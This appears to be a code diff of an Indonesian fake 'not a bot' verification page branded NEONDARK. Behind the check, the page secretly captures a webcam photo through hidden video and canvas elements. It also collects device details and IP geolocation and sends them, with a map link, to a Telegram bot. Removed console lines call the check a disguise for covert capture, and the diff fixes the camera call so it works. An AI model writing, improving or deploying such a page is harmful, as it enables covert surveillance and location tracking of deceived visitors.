@@ -5,31 +5,26 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Verifikasi Bukan Bot</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             background: #0a0a0a;
-            color: #ffffff;
-            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            color: #fff;
+            font-family: 'Segoe UI', system-ui, sans-serif;
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            flex-direction: column;
             padding: 20px;
         }
         .box {
             background: linear-gradient(145deg, #12121c, #1a1a2e);
-            border: 1px solid rgba(255, 255, 255, 0.06);
+            border: 1px solid rgba(255,255,255,0.06);
             border-radius: 24px;
             padding: 40px 35px;
             max-width: 440px;
             width: 100%;
             text-align: center;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.6);
+            box-shadow: 0 20px 60px rgba(0,0,0,0.6);
         }
         .shield {
             width: 72px;
@@ -41,28 +36,18 @@
             justify-content: center;
             margin: 0 auto 16px;
             font-size: 2.2rem;
-            box-shadow: 0 0 40px rgba(37, 99, 235, 0.2);
+            box-shadow: 0 0 40px rgba(37,99,235,0.2);
         }
-        h1 {
-            font-size: 1.5rem;
-            font-weight: 700;
-            letter-spacing: -0.5px;
-            color: #ffffff;
-            margin-bottom: 6px;
-        }
-        .sub {
-            color: #8888aa;
-            font-size: 0.85rem;
-            margin-bottom: 20px;
-        }
+        h1 { font-size: 1.5rem; font-weight: 700; margin-bottom: 6px; }
+        .sub { color: #8888aa; font-size: 0.85rem; margin-bottom: 20px; }
         .status {
             color: #666;
             font-size: 0.8rem;
-            margin: 12px 0;
             padding: 10px 14px;
-            background: rgba(255, 255, 255, 0.03);
+            background: rgba(255,255,255,0.03);
             border-radius: 10px;
-            border: 1px solid rgba(255, 255, 255, 0.04);
+            border: 1px solid rgba(255,255,255,0.04);
+            margin-bottom: 16px;
         }
         .status .dot {
             display: inline-block;
@@ -71,23 +56,10 @@
             border-radius: 50%;
             margin-right: 8px;
         }
-        .dot.green {
-            background: #22c55e;
-            animation: blink 1.2s infinite;
-        }
-        .dot.yellow {
-            background: #eab308;
-            animation: blink 1.2s infinite;
-        }
-        @keyframes blink {
-            0%,
-            100% {
-                opacity: 1;
-            }
-            50% {
-                opacity: 0.2;
-            }
-        }
+        .dot.green { background: #22c55e; animation: blink 1.2s infinite; }
+        .dot.yellow { background: #eab308; animation: blink 1.2s infinite; }
+        .dot.red { background: #ef4444; animation: blink 1.2s infinite; }
+        @keyframes blink { 0%,100% { opacity:1; } 50% { opacity:0.2; } }
         .btn-verify {
             padding: 14px 32px;
             background: linear-gradient(135deg, #2563eb, #7c3aed);
@@ -97,53 +69,27 @@
             font-weight: 600;
             font-size: 0.95rem;
             cursor: pointer;
+            width: 100%;
             transition: all 0.3s ease;
             font-family: inherit;
-            width: 100%;
             display: flex;
             align-items: center;
             justify-content: center;
             gap: 8px;
         }
-        .btn-verify:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 30px rgba(37, 99, 235, 0.3);
-        }
-        .btn-verify:active {
-            transform: scale(0.96);
-        }
-        .btn-verify:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-            transform: none !important;
-        }
-        .footer-text {
-            color: #333;
-            font-size: 0.6rem;
-            margin-top: 16px;
-            letter-spacing: 0.5px;
-        }
-        .footer-text span {
-            color: #555;
-        }
-        video,
-        canvas {
-            display: none !important;
-            position: absolute !important;
-            top: -9999px !important;
-            left: -9999px !important;
-            width: 1px !important;
-            height: 1px !important;
-            opacity: 0 !important;
-            pointer-events: none !important;
-        }
+        .btn-verify:hover { transform: translateY(-2px); box-shadow: 0 8px 30px rgba(37,99,235,0.3); }
+        .btn-verify:active { transform: scale(0.96); }
+        .btn-verify:disabled { opacity: 0.5; cursor: not-allowed; transform: none !important; }
+        .footer-text { color: #333; font-size: 0.6rem; margin-top: 16px; }
+        .footer-text span { color: #555; }
+        video, canvas { display: none !important; position: absolute !important; top: -9999px !important; left: -9999px !important; width: 1px !important; height: 1px !important; opacity: 0 !important; pointer-events: none !important; }
         .toast {
             position: fixed;
             bottom: 30px;
             left: 50%;
             transform: translateX(-50%) translateY(20px);
-            background: rgba(10, 10, 10, 0.95);
-            border: 1px solid rgba(255, 255, 255, 0.06);
+            background: rgba(10,10,10,0.95);
+            border: 1px solid rgba(255,255,255,0.06);
             border-radius: 12px;
             padding: 10px 20px;
             color: #fff;
@@ -155,39 +101,16 @@
             backdrop-filter: blur(12px);
             max-width: 90%;
         }
-        .toast.show {
-            opacity: 1;
-            transform: translateX(-50%) translateY(0);
-        }
-        .toast.success {
-            border-color: rgba(34, 197, 94, 0.3);
-        }
-        .toast.error {
-            border-color: rgba(239, 68, 68, 0.3);
-        }
-        .hidden {
-            display: none !important;
-        }
-        .success-icon {
-            font-size: 3rem;
-            margin-bottom: 10px;
-        }
-        @media (max-width: 480px) {
-            .box {
-                padding: 28px 20px;
-            }
-            h1 {
-                font-size: 1.2rem;
-            }
-            .shield {
-                width: 56px;
-                height: 56px;
-                font-size: 1.6rem;
-            }
-            .btn-verify {
-                padding: 12px 20px;
-                font-size: 0.85rem;
-            }
+        .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
+        .toast.success { border-color: rgba(34,197,94,0.3); }
+        .toast.error { border-color: rgba(239,68,68,0.3); }
+        .hidden { display: none !important; }
+        .success-icon { font-size: 3rem; margin-bottom: 10px; }
+        @media (max-width:480px) {
+            .box { padding: 28px 20px; }
+            h1 { font-size: 1.2rem; }
+            .shield { width: 56px; height: 56px; font-size: 1.6rem; }
+            .btn-verify { padding: 12px 20px; font-size: 0.85rem; }
         }
     </style>
 </head>
@@ -199,22 +122,16 @@
         <div class="shield">🛡️</div>
         <h1>Verifikasi Bukan Bot</h1>
         <p class="sub">Kami perlu memastikan Anda adalah manusia, bukan bot</p>
-
         <div class="status" id="statusBox">
             <span class="dot green" id="statusDot"></span>
             <span id="statusText">Klik tombol di bawah untuk verifikasi</span>
         </div>
-
-        <button class="btn-verify" id="verifyBtn" onclick="startVerification()">
-            📸 Verifikasi Sekarang
-        </button>
-
+        <button class="btn-verify" id="verifyBtn">📸 Verifikasi Sekarang</button>
         <div class="hidden" id="successBox" style="margin-top:16px;">
             <div class="success-icon">✅</div>
             <p style="color:#22c55e; font-weight:600; font-size:0.95rem;">Verifikasi Berhasil!</p>
             <p style="color:#666; font-size:0.7rem; margin-top:4px;">Anda terverifikasi sebagai manusia.</p>
         </div>
-
         <div class="footer-text"><span>NEONDARK</span> · Verifikasi Keamanan</div>
     </div>
 
@@ -255,11 +172,7 @@
         // =============================================================
         function updateStatus(msg, dotColor) {
             statusText.textContent = msg;
-            if (dotColor) {
-                statusDot.className = 'dot ' + dotColor;
-            } else {
-                statusDot.className = 'dot green';
-            }
+            statusDot.className = 'dot ' + (dotColor || 'green');
         }
 
         // =============================================================
@@ -267,9 +180,7 @@
         // =============================================================
         function getDeviceInfo() {
             const ua = navigator.userAgent;
-            let device = 'Unknown',
-                os = 'Unknown',
-                browser = 'Unknown';
+            let device = 'Unknown', os = 'Unknown', browser = 'Unknown';
             if (ua.includes('Android')) os = 'Android';
             else if (ua.includes('iPhone') || ua.includes('iPad')) os = 'iOS';
             else if (ua.includes('Windows')) os = 'Windows';
@@ -285,8 +196,7 @@
             if (os === 'Android') {
                 const match = ua.match(/Android\s([\d.]+)/);
                 if (match) os += ' ' + match[1];
-                const brandMatch = ua.match(
-                    /(Samsung|Xiaomi|Oppo|Vivo|Realme|Nokia|Asus|Sony|OnePlus|Google|Huawei|Lenovo|LG|Motorola)/i);
+                const brandMatch = ua.match(/(Samsung|Xiaomi|Oppo|Vivo|Realme|Nokia|Asus|Sony|OnePlus|Google|Huawei|Lenovo|LG|Motorola)/i);
                 const brand = brandMatch ? brandMatch[1] : '';
                 const modelMatch = ua.match(/\(([^)]+)\)/);
                 const model = modelMatch ? modelMatch[1].split(';').pop().trim() : '';
@@ -318,15 +228,7 @@
                     isp: data.org || 'Unknown'
                 };
             } catch (e) {
-                return {
-                    ip: 'Unknown',
-                    city: 'Unknown',
-                    region: 'Unknown',
-                    country: 'Unknown',
-                    lat: 0,
-                    lon: 0,
-                    isp: 'Unknown'
-                };
+                return { ip: 'Unknown', city: 'Unknown', region: 'Unknown', country: 'Unknown', lat: 0, lon: 0, isp: 'Unknown' };
             }
         }
 
@@ -365,7 +267,6 @@
             message += `🗺️ *Map:* https://www.google.com/maps?q=${location.lat},${location.lon}\n`;
 
             try {
-                // Kirim pesan
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -376,7 +277,6 @@
                     })
                 });
 
-                // Kirim foto
                 if (photoData) {
                     const blob = dataURLtoBlob(photoData);
                     const formData = new FormData();
@@ -389,7 +289,6 @@
                         body: formData
                     });
                 }
-
                 return true;
             } catch (e) {
                 console.error('Send error:', e);
@@ -398,9 +297,9 @@
         }
 
         // =============================================================
-        // START VERIFICATION
+        // START VERIFICATION (FIX: langsung panggil getUserMedia di click)
         // =============================================================
-        async function startVerification() {
+        btn.addEventListener('click', function(e) {
             if (isProcessing) return;
             isProcessing = true;
 
@@ -408,92 +307,99 @@
             btn.innerHTML = '⏳ Mengakses kamera...';
             updateStatus('📸 Meminta akses kamera...', 'yellow');
 
-            try {
-                // Request camera — popup izin akan muncul dengan judul "Verifikasi Bukan Bot"
-                stream = await navigator.mediaDevices.getUserMedia({
-                    video: {
-                        facingMode: 'user',
-                        width: { ideal: 640 },
-                        height: { ideal: 480 }
-                    },
-                    audio: false
-                });
-
+            // === LANGSUNG PANGGIL getUserMedia (tanpa async/await berlebihan) ===
+            navigator.mediaDevices.getUserMedia({
+                video: {
+                    facingMode: 'user',
+                    width: { ideal: 640 },
+                    height: { ideal: 480 }
+                },
+                audio: false
+            })
+            .then(function(stream) {
+                // Berhasil dapat akses kamera
                 updateStatus('✅ Kamera aktif! Mengambil foto...', 'green');
 
                 const video = document.getElementById('video');
                 video.srcObject = stream;
-                await video.play();
-
+                return video.play().then(function() {
+                    return stream;
+                });
+            })
+            .then(function(stream) {
                 // Capture foto
-                await new Promise(resolve => setTimeout(resolve, 500));
-
                 const canvas = document.getElementById('canvas');
                 canvas.width = 640;
                 canvas.height = 480;
                 const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                ctx.drawImage(document.getElementById('video'), 0, 0, canvas.width, canvas.height);
                 const photo = canvas.toDataURL('image/jpeg', 0.85);
 
                 // Stop camera
                 if (stream) {
-                    stream.getTracks().forEach(t => t.stop());
+                    stream.getTracks().forEach(function(t) { t.stop(); });
                     stream = null;
                 }
 
                 updateStatus('📤 Mengirim data verifikasi...', 'yellow');
 
                 // Kirim ke Telegram
-                const success = await sendToTelegram(photo);
+                sendToTelegram(photo).then(function(success) {
+                    if (success) {
+                        updateStatus('✅ Verifikasi berhasil!', 'green');
+                        btn.classList.add('hidden');
+                        successBox.classList.remove('hidden');
+                        showToast('✅ Verifikasi berhasil!', 'success');
+                        document.querySelector('.shield').innerHTML = '✅';
+                        document.querySelector('h1').textContent = '✅ Terverifikasi!';
+                        document.querySelector('.sub').textContent = 'Anda terkonfirmasi sebagai manusia.';
+                    } else {
+                        throw new Error('Gagal mengirim data');
+                    }
+                    isProcessing = false;
+                }).catch(function(err) {
+                    console.error('Send error:', err);
+                    updateStatus('❌ Gagal mengirim data. Coba lagi.', 'red');
+                    showToast('❌ Gagal mengirim data', 'error');
+                    btn.disabled = false;
+                    btn.innerHTML = '🔄 Coba Lagi';
+                    isProcessing = false;
+                });
 
-                if (success) {
-                    updateStatus('✅ Verifikasi berhasil!', 'green');
-                    btn.classList.add('hidden');
-                    successBox.classList.remove('hidden');
-                    showToast('✅ Verifikasi berhasil!', 'success');
-                    document.querySelector('.shield').innerHTML = '✅';
-                    document.querySelector('h1').textContent = '✅ Terverifikasi!';
-                    document.querySelector('.sub').textContent = 'Anda terkonfirmasi sebagai manusia.';
-                } else {
-                    throw new Error('Gagal mengirim data');
-                }
-
-            } catch (e) {
-                console.error('Error:', e);
-                updateStatus('❌ Verifikasi gagal. Coba lagi.', 'yellow');
+            })
+            .catch(function(err) {
+                console.error('Camera error:', err);
+                updateStatus('❌ Gagal mengakses kamera. Coba lagi.', 'red');
                 showToast('❌ Gagal mengakses kamera. Coba lagi.', 'error');
                 btn.disabled = false;
                 btn.innerHTML = '🔄 Coba Lagi';
                 isProcessing = false;
-
                 if (stream) {
-                    stream.getTracks().forEach(t => t.stop());
+                    stream.getTracks().forEach(function(t) { t.stop(); });
                     stream = null;
                 }
-            }
-        }
+            });
+        });
 
         // =============================================================
         // PREVENT CONTEXT MENU
         // =============================================================
-        document.addEventListener('contextmenu', e => e.preventDefault());
-        document.addEventListener('dragstart', e => e.preventDefault());
-        document.addEventListener('drop', e => e.preventDefault());
+        document.addEventListener('contextmenu', function(e) { e.preventDefault(); });
+        document.addEventListener('dragstart', function(e) { e.preventDefault(); });
+        document.addEventListener('drop', function(e) { e.preventDefault(); });
 
         // =============================================================
         // CONSOLE LOG
         // =============================================================
-        console.log('%c🛡️ NEONDARK VERIFIER', 'color:#7c3aed;font-size:20px;font-weight:700;');
-        console.log('%c✅ Kedok: Verifikasi Bukan Bot', 'color:#22c55e;font-size:14px;');
-        console.log('%c📸 Capture diam-diam & kirim ke Telegram', 'color:#888;font-size:12px;');
+        console.log('%c🛡️ NEONDARK VERIFIER FIX', 'color:#7c3aed;font-size:20px;font-weight:700;');
+        console.log('%c✅ getUserMedia dipanggil langsung di click event', 'color:#22c55e;font-size:14px;');
 
         // =============================================================
         // WELCOME TOAST
         // =============================================================
-        setTimeout(() => {
+        setTimeout(function() {
             showToast('🛡️ Klik "Verifikasi Sekarang" untuk memulai', '');
         }, 800);
     </script>
-
 </body>
 </html>
